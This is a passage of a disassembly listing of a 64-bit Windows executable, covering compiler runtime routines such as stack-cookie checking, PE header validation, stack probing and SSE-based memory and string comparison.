   14000d360:	48 8b ca             	mov    %rdx,%rcx
   14000d363:	49 8b d1             	mov    %r9,%rdx
   14000d366:	e8 0d 00 00 00       	call   0x14000d378
   14000d36b:	b8 01 00 00 00       	mov    $0x1,%eax
   14000d370:	48 83 c4 28          	add    $0x28,%rsp
   14000d374:	c3                   	ret
   14000d375:	cc                   	int3
   14000d376:	cc                   	int3
   14000d377:	cc                   	int3
   14000d378:	40 53                	rex push %rbx
   14000d37a:	45 8b 18             	mov    (%r8),%r11d
   14000d37d:	48 8b da             	mov    %rdx,%rbx
   14000d380:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000d384:	4c 8b c9             	mov    %rcx,%r9
   14000d387:	41 f6 00 04          	testb  $0x4,(%r8)
   14000d38b:	4c 8b d1             	mov    %rcx,%r10
   14000d38e:	74 13                	je     0x14000d3a3
   14000d390:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000d394:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000d398:	f7 d8                	neg    %eax
   14000d39a:	4c 03 d1             	add    %rcx,%r10
   14000d39d:	48 63 c8             	movslq %eax,%rcx
   14000d3a0:	4c 23 d1             	and    %rcx,%r10
   14000d3a3:	49 63 c3             	movslq %r11d,%rax
   14000d3a6:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000d3aa:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000d3ae:	8b 48 08             	mov    0x8(%rax),%ecx
   14000d3b1:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000d3b5:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000d3ba:	74 0b                	je     0x14000d3c7
   14000d3bc:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000d3c1:	83 e0 f0             	and    $0xfffffff0,%eax
   14000d3c4:	4c 03 c8             	add    %rax,%r9
   14000d3c7:	4c 33 ca             	xor    %rdx,%r9
   14000d3ca:	49 8b c9             	mov    %r9,%rcx
   14000d3cd:	5b                   	pop    %rbx
   14000d3ce:	e9 1d 00 00 00       	jmp    0x14000d3f0
   14000d3d3:	cc                   	int3
   14000d3d4:	cc                   	int3
   14000d3d5:	cc                   	int3
   14000d3d6:	cc                   	int3
   14000d3d7:	cc                   	int3
   14000d3d8:	cc                   	int3
   14000d3d9:	cc                   	int3
   14000d3da:	cc                   	int3
   14000d3db:	cc                   	int3
   14000d3dc:	cc                   	int3
   14000d3dd:	cc                   	int3
   14000d3de:	cc                   	int3
   14000d3df:	cc                   	int3
   14000d3e0:	cc                   	int3
   14000d3e1:	cc                   	int3
   14000d3e2:	cc                   	int3
   14000d3e3:	cc                   	int3
   14000d3e4:	cc                   	int3
   14000d3e5:	cc                   	int3
   14000d3e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d3ed:	00 00 00 
   14000d3f0:	48 3b 0d 31 9c 00 00 	cmp    0x9c31(%rip),%rcx        # 0x140017028
   14000d3f7:	75 10                	jne    0x14000d409
   14000d3f9:	48 c1 c1 10          	rol    $0x10,%rcx
   14000d3fd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   14000d402:	75 01                	jne    0x14000d405
   14000d404:	c3                   	ret
   14000d405:	48 c1 c9 10          	ror    $0x10,%rcx
   14000d409:	e9 06 01 00 00       	jmp    0x14000d514
   14000d40e:	cc                   	int3
   14000d40f:	cc                   	int3
   14000d410:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000d414:	45 33 c9             	xor    %r9d,%r9d
   14000d417:	4c 03 c1             	add    %rcx,%r8
   14000d41a:	4c 8b d2             	mov    %rdx,%r10
   14000d41d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000d422:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000d427:	48 83 c0 18          	add    $0x18,%rax
   14000d42b:	49 03 c0             	add    %r8,%rax
   14000d42e:	45 85 db             	test   %r11d,%r11d
   14000d431:	74 1e                	je     0x14000d451
   14000d433:	8b 50 0c             	mov    0xc(%rax),%edx
   14000d436:	4c 3b d2             	cmp    %rdx,%r10
   14000d439:	72 0a                	jb     0x14000d445
   14000d43b:	8b 48 08             	mov    0x8(%rax),%ecx
   14000d43e:	03 ca                	add    %edx,%ecx
   14000d440:	4c 3b d1             	cmp    %rcx,%r10
   14000d443:	72 0e                	jb     0x14000d453
   14000d445:	41 ff c1             	inc    %r9d
   14000d448:	48 83 c0 28          	add    $0x28,%rax
   14000d44c:	45 3b cb             	cmp    %r11d,%r9d
   14000d44f:	72 e2                	jb     0x14000d433
   14000d451:	33 c0                	xor    %eax,%eax
   14000d453:	c3                   	ret
   14000d454:	cc                   	int3
   14000d455:	cc                   	int3
   14000d456:	cc                   	int3
   14000d457:	cc                   	int3
   14000d458:	cc                   	int3
   14000d459:	cc                   	int3
   14000d45a:	cc                   	int3
   14000d45b:	cc                   	int3
   14000d45c:	cc                   	int3
   14000d45d:	cc                   	int3
   14000d45e:	cc                   	int3
   14000d45f:	cc                   	int3
   14000d460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d465:	57                   	push   %rdi
   14000d466:	48 83 ec 20          	sub    $0x20,%rsp
   14000d46a:	48 8b d9             	mov    %rcx,%rbx
   14000d46d:	48 8d 3d 8c 2b ff ff 	lea    -0xd474(%rip),%rdi        # 0x140000000
   14000d474:	48 8b cf             	mov    %rdi,%rcx
   14000d477:	e8 34 00 00 00       	call   0x14000d4b0
   14000d47c:	85 c0                	test   %eax,%eax
   14000d47e:	74 22                	je     0x14000d4a2
   14000d480:	48 2b df             	sub    %rdi,%rbx
   14000d483:	48 8b d3             	mov    %rbx,%rdx
   14000d486:	48 8b cf             	mov    %rdi,%rcx
   14000d489:	e8 82 ff ff ff       	call   0x14000d410
   14000d48e:	48 85 c0             	test   %rax,%rax
   14000d491:	74 0f                	je     0x14000d4a2
   14000d493:	8b 40 24             	mov    0x24(%rax),%eax
   14000d496:	c1 e8 1f             	shr    $0x1f,%eax
   14000d499:	f7 d0                	not    %eax
   14000d49b:	83 e0 01             	and    $0x1,%eax
   14000d49e:	eb 02                	jmp    0x14000d4a2
   14000d4a0:	33 c0                	xor    %eax,%eax
   14000d4a2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d4a7:	48 83 c4 20          	add    $0x20,%rsp
   14000d4ab:	5f                   	pop    %rdi
   14000d4ac:	c3                   	ret
   14000d4ad:	cc                   	int3
   14000d4ae:	cc                   	int3
   14000d4af:	cc                   	int3
   14000d4b0:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000d4b5:	66 39 01             	cmp    %ax,(%rcx)
   14000d4b8:	75 20                	jne    0x14000d4da
   14000d4ba:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000d4be:	48 03 c1             	add    %rcx,%rax
   14000d4c1:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   14000d4c7:	75 11                	jne    0x14000d4da
   14000d4c9:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000d4ce:	66 39 48 18          	cmp    %cx,0x18(%rax)
   14000d4d2:	75 06                	jne    0x14000d4da
   14000d4d4:	b8 01 00 00 00       	mov    $0x1,%eax
   14000d4d9:	c3                   	ret
   14000d4da:	33 c0                	xor    %eax,%eax
   14000d4dc:	c3                   	ret
   14000d4dd:	cc                   	int3
   14000d4de:	cc                   	int3
   14000d4df:	cc                   	int3
   14000d4e0:	40 53                	rex push %rbx
   14000d4e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d4e6:	48 8b d9             	mov    %rcx,%rbx
   14000d4e9:	33 c9                	xor    %ecx,%ecx
   14000d4eb:	ff 15 77 0b 00 00    	call   *0xb77(%rip)        # 0x14000e068
   14000d4f1:	48 8b cb             	mov    %rbx,%rcx
   14000d4f4:	ff 15 66 0b 00 00    	call   *0xb66(%rip)        # 0x14000e060
   14000d4fa:	ff 15 10 0c 00 00    	call   *0xc10(%rip)        # 0x14000e110
   14000d500:	48 8b c8             	mov    %rax,%rcx
   14000d503:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000d508:	48 83 c4 20          	add    $0x20,%rsp
   14000d50c:	5b                   	pop    %rbx
   14000d50d:	48 ff 25 0c 0c 00 00 	rex.W jmp *0xc0c(%rip)        # 0x14000e120
   14000d514:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000d519:	48 83 ec 38          	sub    $0x38,%rsp
   14000d51d:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000d522:	ff 15 50 0b 00 00    	call   *0xb50(%rip)        # 0x14000e078
   14000d528:	85 c0                	test   %eax,%eax
   14000d52a:	74 07                	je     0x14000d533
   14000d52c:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000d531:	cd 29                	int    $0x29
   14000d533:	48 8d 0d e6 b1 00 00 	lea    0xb1e6(%rip),%rcx        # 0x140018720
   14000d53a:	e8 c9 01 00 00       	call   0x14000d708
   14000d53f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000d544:	48 89 05 cd b2 00 00 	mov    %rax,0xb2cd(%rip)        # 0x140018818
   14000d54b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000d550:	48 83 c0 08          	add    $0x8,%rax
   14000d554:	48 89 05 5d b2 00 00 	mov    %rax,0xb25d(%rip)        # 0x1400187b8
   14000d55b:	48 8b 05 b6 b2 00 00 	mov    0xb2b6(%rip),%rax        # 0x140018818
   14000d562:	48 89 05 27 b1 00 00 	mov    %rax,0xb127(%rip)        # 0x140018690
   14000d569:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000d56e:	48 89 05 2b b2 00 00 	mov    %rax,0xb22b(%rip)        # 0x1400187a0
   14000d575:	c7 05 01 b1 00 00 09 	movl   $0xc0000409,0xb101(%rip)        # 0x140018680
   14000d57c:	04 00 c0 
   14000d57f:	c7 05 fb b0 00 00 01 	movl   $0x1,0xb0fb(%rip)        # 0x140018684
   14000d586:	00 00 00 
   14000d589:	c7 05 05 b1 00 00 01 	movl   $0x1,0xb105(%rip)        # 0x140018698
   14000d590:	00 00 00 
   14000d593:	b8 08 00 00 00       	mov    $0x8,%eax
   14000d598:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000d59c:	48 8d 0d fd b0 00 00 	lea    0xb0fd(%rip),%rcx        # 0x1400186a0
   14000d5a3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000d5aa:	00 
   14000d5ab:	b8 08 00 00 00       	mov    $0x8,%eax
   14000d5b0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000d5b4:	48 8b 0d 6d 9a 00 00 	mov    0x9a6d(%rip),%rcx        # 0x140017028
   14000d5bb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000d5c0:	b8 08 00 00 00       	mov    $0x8,%eax
   14000d5c5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   14000d5c9:	48 8b 0d 50 9a 00 00 	mov    0x9a50(%rip),%rcx        # 0x140017020
   14000d5d0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000d5d5:	48 8d 0d f4 7f 00 00 	lea    0x7ff4(%rip),%rcx        # 0x1400155d0
   14000d5dc:	e8 ff fe ff ff       	call   0x14000d4e0
   14000d5e1:	48 83 c4 38          	add    $0x38,%rsp
   14000d5e5:	c3                   	ret
   14000d5e6:	cc                   	int3
   14000d5e7:	cc                   	int3
   14000d5e8:	48 83 ec 28          	sub    $0x28,%rsp
   14000d5ec:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000d5f1:	e8 06 00 00 00       	call   0x14000d5fc
   14000d5f6:	48 83 c4 28          	add    $0x28,%rsp
   14000d5fa:	c3                   	ret
   14000d5fb:	cc                   	int3
   14000d5fc:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000d600:	48 83 ec 28          	sub    $0x28,%rsp
   14000d604:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000d609:	ff 15 69 0a 00 00    	call   *0xa69(%rip)        # 0x14000e078
   14000d60f:	85 c0                	test   %eax,%eax
   14000d611:	74 08                	je     0x14000d61b
   14000d613:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000d617:	8b c8                	mov    %eax,%ecx
   14000d619:	cd 29                	int    $0x29
   14000d61b:	48 8d 0d fe b0 00 00 	lea    0xb0fe(%rip),%rcx        # 0x140018720
   14000d622:	e8 71 00 00 00       	call   0x14000d698
   14000d627:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000d62c:	48 89 05 e5 b1 00 00 	mov    %rax,0xb1e5(%rip)        # 0x140018818
   14000d633:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   14000d638:	48 83 c0 08          	add    $0x8,%rax
   14000d63c:	48 89 05 75 b1 00 00 	mov    %rax,0xb175(%rip)        # 0x1400187b8
   14000d643:	48 8b 05 ce b1 00 00 	mov    0xb1ce(%rip),%rax        # 0x140018818
   14000d64a:	48 89 05 3f b0 00 00 	mov    %rax,0xb03f(%rip)        # 0x140018690
   14000d651:	c7 05 25 b0 00 00 09 	movl   $0xc0000409,0xb025(%rip)        # 0x140018680
   14000d658:	04 00 c0 
   14000d65b:	c7 05 1f b0 00 00 01 	movl   $0x1,0xb01f(%rip)        # 0x140018684
   14000d662:	00 00 00 
   14000d665:	c7 05 29 b0 00 00 01 	movl   $0x1,0xb029(%rip)        # 0x140018698
   14000d66c:	00 00 00 
   14000d66f:	b8 08 00 00 00       	mov    $0x8,%eax
   14000d674:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000d678:	48 8d 0d 21 b0 00 00 	lea    0xb021(%rip),%rcx        # 0x1400186a0
   14000d67f:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000d683:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   14000d687:	48 8d 0d 42 7f 00 00 	lea    0x7f42(%rip),%rcx        # 0x1400155d0
   14000d68e:	e8 4d fe ff ff       	call   0x14000d4e0
   14000d693:	48 83 c4 28          	add    $0x28,%rsp
   14000d697:	c3                   	ret
   14000d698:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000d69d:	57                   	push   %rdi
   14000d69e:	48 83 ec 40          	sub    $0x40,%rsp
   14000d6a2:	48 8b d9             	mov    %rcx,%rbx
   14000d6a5:	ff 15 95 09 00 00    	call   *0x995(%rip)        # 0x14000e040
   14000d6ab:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   14000d6b2:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000d6b7:	48 8b cf             	mov    %rdi,%rcx
   14000d6ba:	45 33 c0             	xor    %r8d,%r8d
   14000d6bd:	ff 15 85 09 00 00    	call   *0x985(%rip)        # 0x14000e048
   14000d6c3:	48 85 c0             	test   %rax,%rax
   14000d6c6:	74 32                	je     0x14000d6fa
   14000d6c8:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000d6ce:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000d6d3:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   14000d6d8:	4c 8b c8             	mov    %rax,%r9
   14000d6db:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000d6e0:	4c 8b c7             	mov    %rdi,%r8
   14000d6e3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000d6e8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000d6ed:	33 c9                	xor    %ecx,%ecx
   14000d6ef:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000d6f4:	ff 15 56 09 00 00    	call   *0x956(%rip)        # 0x14000e050
   14000d6fa:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000d6ff:	48 83 c4 40          	add    $0x40,%rsp
   14000d703:	5f                   	pop    %rdi
   14000d704:	c3                   	ret
   14000d705:	cc                   	int3
   14000d706:	cc                   	int3
   14000d707:	cc                   	int3
   14000d708:	40 53                	rex push %rbx
   14000d70a:	56                   	push   %rsi
   14000d70b:	57                   	push   %rdi
   14000d70c:	48 83 ec 40          	sub    $0x40,%rsp
   14000d710:	48 8b d9             	mov    %rcx,%rbx
   14000d713:	ff 15 27 09 00 00    	call   *0x927(%rip)        # 0x14000e040
   14000d719:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   14000d720:	33 ff                	xor    %edi,%edi
   14000d722:	45 33 c0             	xor    %r8d,%r8d
   14000d725:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000d72a:	48 8b ce             	mov    %rsi,%rcx
   14000d72d:	ff 15 15 09 00 00    	call   *0x915(%rip)        # 0x14000e048
   14000d733:	48 85 c0             	test   %rax,%rax
   14000d736:	74 39                	je     0x14000d771
   14000d738:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000d73e:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000d743:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000d748:	4c 8b c8             	mov    %rax,%r9
   14000d74b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000d750:	4c 8b c6             	mov    %rsi,%r8
   14000d753:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000d758:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000d75d:	33 c9                	xor    %ecx,%ecx
   14000d75f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000d764:	ff 15 e6 08 00 00    	call   *0x8e6(%rip)        # 0x14000e050
   14000d76a:	ff c7                	inc    %edi
   14000d76c:	83 ff 02             	cmp    $0x2,%edi
   14000d76f:	7c b1                	jl     0x14000d722
   14000d771:	48 83 c4 40          	add    $0x40,%rsp
   14000d775:	5f                   	pop    %rdi
   14000d776:	5e                   	pop    %rsi
   14000d777:	5b                   	pop    %rbx
   14000d778:	c3                   	ret
   14000d779:	cc                   	int3
   14000d77a:	cc                   	int3
   14000d77b:	cc                   	int3
   14000d77c:	cc                   	int3
   14000d77d:	cc                   	int3
   14000d77e:	cc                   	int3
   14000d77f:	cc                   	int3
   14000d780:	cc                   	int3
   14000d781:	cc                   	int3
   14000d782:	cc                   	int3
   14000d783:	cc                   	int3
   14000d784:	cc                   	int3
   14000d785:	cc                   	int3
   14000d786:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d78d:	00 00 00 
   14000d790:	48 83 ec 10          	sub    $0x10,%rsp
   14000d794:	4c 89 14 24          	mov    %r10,(%rsp)
   14000d798:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000d79d:	4d 33 db             	xor    %r11,%r11
   14000d7a0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000d7a5:	4c 2b d0             	sub    %rax,%r10
   14000d7a8:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000d7ac:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000d7b3:	00 00 
   14000d7b5:	4d 3b d3             	cmp    %r11,%r10
   14000d7b8:	73 16                	jae    0x14000d7d0
   14000d7ba:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000d7c0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000d7c7:	41 c6 03 00          	movb   $0x0,(%r11)
   14000d7cb:	4d 3b d3             	cmp    %r11,%r10
   14000d7ce:	75 f0                	jne    0x14000d7c0
   14000d7d0:	4c 8b 14 24          	mov    (%rsp),%r10
   14000d7d4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000d7d9:	48 83 c4 10          	add    $0x10,%rsp
   14000d7dd:	c3                   	ret
   14000d7de:	cc                   	int3
   14000d7df:	cc                   	int3
   14000d7e0:	cc                   	int3
   14000d7e1:	cc                   	int3
   14000d7e2:	cc                   	int3
   14000d7e3:	cc                   	int3
   14000d7e4:	cc                   	int3
   14000d7e5:	cc                   	int3
   14000d7e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d7ed:	00 00 00 
   14000d7f0:	48 2b d1             	sub    %rcx,%rdx
   14000d7f3:	49 83 f8 08          	cmp    $0x8,%r8
   14000d7f7:	72 22                	jb     0x14000d81b
   14000d7f9:	f6 c1 07             	test   $0x7,%cl
   14000d7fc:	74 14                	je     0x14000d812
   14000d7fe:	66 90                	xchg   %ax,%ax
   14000d800:	8a 01                	mov    (%rcx),%al
   14000d802:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000d805:	75 2c                	jne    0x14000d833
   14000d807:	48 ff c1             	inc    %rcx
   14000d80a:	49 ff c8             	dec    %r8
   14000d80d:	f6 c1 07             	test   $0x7,%cl
   14000d810:	75 ee                	jne    0x14000d800
   14000d812:	4d 8b c8             	mov    %r8,%r9
   14000d815:	49 c1 e9 03          	shr    $0x3,%r9
   14000d819:	75 1f                	jne    0x14000d83a
   14000d81b:	4d 85 c0             	test   %r8,%r8
   14000d81e:	74 0f                	je     0x14000d82f
   14000d820:	8a 01                	mov    (%rcx),%al
   14000d822:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   14000d825:	75 0c                	jne    0x14000d833
   14000d827:	48 ff c1             	inc    %rcx
   14000d82a:	49 ff c8             	dec    %r8
   14000d82d:	75 f1                	jne    0x14000d820
   14000d82f:	48 33 c0             	xor    %rax,%rax
   14000d832:	c3                   	ret
   14000d833:	1b c0                	sbb    %eax,%eax
   14000d835:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000d838:	c3                   	ret
   14000d839:	90                   	nop
   14000d83a:	49 c1 e9 02          	shr    $0x2,%r9
   14000d83e:	74 37                	je     0x14000d877
   14000d840:	48 8b 01             	mov    (%rcx),%rax
   14000d843:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000d847:	75 5b                	jne    0x14000d8a4
   14000d849:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000d84d:	48 3b 44 11 08       	cmp    0x8(%rcx,%rdx,1),%rax
   14000d852:	75 4c                	jne    0x14000d8a0
   14000d854:	48 8b 41 10          	mov    0x10(%rcx),%rax
   14000d858:	48 3b 44 11 10       	cmp    0x10(%rcx,%rdx,1),%rax
   14000d85d:	75 3d                	jne    0x14000d89c
   14000d85f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000d863:	48 3b 44 11 18       	cmp    0x18(%rcx,%rdx,1),%rax
   14000d868:	75 2e                	jne    0x14000d898
   14000d86a:	48 83 c1 20          	add    $0x20,%rcx
   14000d86e:	49 ff c9             	dec    %r9
   14000d871:	75 cd                	jne    0x14000d840
   14000d873:	49 83 e0 1f          	and    $0x1f,%r8
   14000d877:	4d 8b c8             	mov    %r8,%r9
   14000d87a:	49 c1 e9 03          	shr    $0x3,%r9
   14000d87e:	74 9b                	je     0x14000d81b
   14000d880:	48 8b 01             	mov    (%rcx),%rax
   14000d883:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   14000d887:	75 1b                	jne    0x14000d8a4
   14000d889:	48 83 c1 08          	add    $0x8,%rcx
   14000d88d:	49 ff c9             	dec    %r9
   14000d890:	75 ee                	jne    0x14000d880
   14000d892:	49 83 e0 07          	and    $0x7,%r8
   14000d896:	eb 83                	jmp    0x14000d81b
   14000d898:	48 83 c1 08          	add    $0x8,%rcx
   14000d89c:	48 83 c1 08          	add    $0x8,%rcx
   14000d8a0:	48 83 c1 08          	add    $0x8,%rcx
   14000d8a4:	48 8b 0c 0a          	mov    (%rdx,%rcx,1),%rcx
   14000d8a8:	48 0f c8             	bswap  %rax
   14000d8ab:	48 0f c9             	bswap  %rcx
   14000d8ae:	48 3b c1             	cmp    %rcx,%rax
   14000d8b1:	1b c0                	sbb    %eax,%eax
   14000d8b3:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000d8b6:	c3                   	ret
   14000d8b7:	cc                   	int3
   14000d8b8:	0f b6 c2             	movzbl %dl,%eax
   14000d8bb:	4c 8b c1             	mov    %rcx,%r8
   14000d8be:	44 8b d0             	mov    %eax,%r10d
   14000d8c1:	49 83 e0 f0          	and    $0xfffffffffffffff0,%r8
   14000d8c5:	41 c1 e2 08          	shl    $0x8,%r10d
   14000d8c9:	83 e1 0f             	and    $0xf,%ecx
   14000d8cc:	44 0b d0             	or     %eax,%r10d
   14000d8cf:	45 33 c9             	xor    %r9d,%r9d
   14000d8d2:	83 c8 ff             	or     $0xffffffff,%eax
   14000d8d5:	d3 e0                	shl    %cl,%eax
   14000d8d7:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   14000d8dc:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   14000d8e1:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000d8e4:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000d8e9:	66 0f 70 d1 00       	pshufd $0x0,%xmm1,%xmm2
   14000d8ee:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000d8f2:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000d8f7:	66 0f eb c8          	por    %xmm0,%xmm1
   14000d8fb:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000d8ff:	23 d0                	and    %eax,%edx
   14000d901:	75 21                	jne    0x14000d924
   14000d903:	49 83 c0 10          	add    $0x10,%r8
   14000d907:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   14000d90b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000d90e:	66 41 0f 74 08       	pcmpeqb (%r8),%xmm1
   14000d913:	66 41 0f 74 00       	pcmpeqb (%r8),%xmm0
   14000d918:	66 0f eb c8          	por    %xmm0,%xmm1
   14000d91c:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   14000d920:	85 d2                	test   %edx,%edx
   14000d922:	74 df                	je     0x14000d903
   14000d924:	0f bc d2             	bsf    %edx,%edx
   14000d927:	49 03 d0             	add    %r8,%rdx
   14000d92a:	44 38 12             	cmp    %r10b,(%rdx)
   14000d92d:	4c 0f 44 ca          	cmove  %rdx,%r9
   14000d931:	49 8b c1             	mov    %r9,%rax
   14000d934:	c3                   	ret
   14000d935:	cc                   	int3
   14000d936:	cc                   	int3
   14000d937:	cc                   	int3
   14000d938:	cc                   	int3
   14000d939:	cc                   	int3
   14000d93a:	cc                   	int3
   14000d93b:	cc                   	int3
   14000d93c:	cc                   	int3
   14000d93d:	cc                   	int3
   14000d93e:	cc                   	int3
   14000d93f:	cc                   	int3
   14000d940:	cc                   	int3
   14000d941:	cc                   	int3
   14000d942:	cc                   	int3
   14000d943:	cc                   	int3
   14000d944:	cc                   	int3
   14000d945:	cc                   	int3
   14000d946:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d94d:	00 00 00 
   14000d950:	ff e0                	jmp    *%rax
   14000d952:	cc                   	int3
   14000d953:	cc                   	int3
   14000d954:	cc                   	int3
   14000d955:	cc                   	int3
   14000d956:	cc                   	int3
   14000d957:	cc                   	int3
   14000d958:	cc                   	int3
   14000d959:	cc                   	int3
   14000d95a:	cc                   	int3
   14000d95b:	cc                   	int3
   14000d95c:	cc                   	int3
   14000d95d:	cc                   	int3
   14000d95e:	cc                   	int3
   14000d95f:	cc                   	int3
   14000d960:	cc                   	int3
   14000d961:	cc                   	int3
   14000d962:	cc                   	int3
   14000d963:	cc                   	int3
   14000d964:	cc                   	int3
   14000d965:	cc                   	int3
   14000d966:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d96d:	00 00 00 
   14000d970:	ff 25 c2 08 00 00    	jmp    *0x8c2(%rip)        # 0x14000e238
   14000d976:	cc                   	int3
   14000d977:	cc                   	int3
   14000d978:	cc                   	int3
   14000d979:	cc                   	int3
   14000d97a:	cc                   	int3
   14000d97b:	cc                   	int3
   14000d97c:	cc                   	int3
   14000d97d:	cc                   	int3
   14000d97e:	cc                   	int3
   14000d97f:	cc                   	int3
   14000d980:	40 55                	rex push %rbp
   14000d982:	48 83 ec 20          	sub    $0x20,%rsp
   14000d986:	48 8b ea             	mov    %rdx,%rbp
   14000d989:	48 8b 01             	mov    (%rcx),%rax
   14000d98c:	48 8b d1             	mov    %rcx,%rdx
   14000d98f:	8b 08                	mov    (%rax),%ecx
   14000d991:	e8 72 5e ff ff       	call   0x140003808
   14000d996:	90                   	nop
   14000d997:	48 83 c4 20          	add    $0x20,%rsp
   14000d99b:	5d                   	pop    %rbp
   14000d99c:	c3                   	ret
   14000d99d:	cc                   	int3
   14000d99e:	40 55                	rex push %rbp
   14000d9a0:	48 8b ea             	mov    %rdx,%rbp
   14000d9a3:	48 8b 01             	mov    (%rcx),%rax
   14000d9a6:	33 c9                	xor    %ecx,%ecx
   14000d9a8:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000d9ae:	0f 94 c1             	sete   %cl
   14000d9b1:	8b c1                	mov    %ecx,%eax
   14000d9b3:	5d                   	pop    %rbp
   14000d9b4:	c3                   	ret
   14000d9b5:	cc                   	int3
   14000d9b6:	40 53                	rex push %rbx
   14000d9b8:	55                   	push   %rbp
   14000d9b9:	48 83 ec 28          	sub    $0x28,%rsp
   14000d9bd:	48 8b ea             	mov    %rdx,%rbp
   14000d9c0:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000d9c4:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000d9c8:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000d9cc:	74 6c                	je     0x14000da3a
   14000d9ce:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d9d2:	48 8b 08             	mov    (%rax),%rcx
   14000d9d5:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
